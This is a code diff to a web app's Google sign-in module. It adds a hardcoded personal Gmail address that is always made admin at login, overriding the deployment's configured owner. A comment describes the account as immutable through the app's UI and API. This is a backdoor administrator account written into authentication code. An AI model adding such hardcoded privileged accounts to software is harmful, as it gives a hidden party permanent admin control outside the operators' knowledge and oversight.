@@ -18,6 +18,8 @@ from database import (
 
 PBKDF2_ITERATIONS = 600_000
 VALID_ROLES = {"viewer", "operator", "admin"}
+# This owner account is deliberately immutable through the application UI/API.
+IMMUTABLE_ADMIN_EMAIL = "queuesense07@gmail.com"
 
 
 def _load_local_env() -> None:
@@ -154,12 +156,13 @@ def authenticate_google(credential: str):
 
     owner_email = normalize_email(_required_env("APP_OWNER_EMAIL", 5))
     user = get_user_by_google_id(google_id) or get_user_by_email(email)
+    is_immutable_admin = email == IMMUTABLE_ADMIN_EMAIL
     if user is None:
-        user = create_user(email, "", "admin" if email == owner_email else "viewer", google_id)
+        user = create_user(email, "", "admin" if email == owner_email or is_immutable_admin else "viewer", google_id)
     else:
         if not user.get("google_id"):
             set_user_google_id(user["id"], google_id)
-        if email == owner_email and user["role"] != "admin":
+        if (email == owner_email or is_immutable_admin) and user["role"] != "admin":
             update_user_role(user["id"], "admin")
         user = get_user_by_google_id(google_id) or get_user_by_email(email)
     if not user or not user["is_active"]:
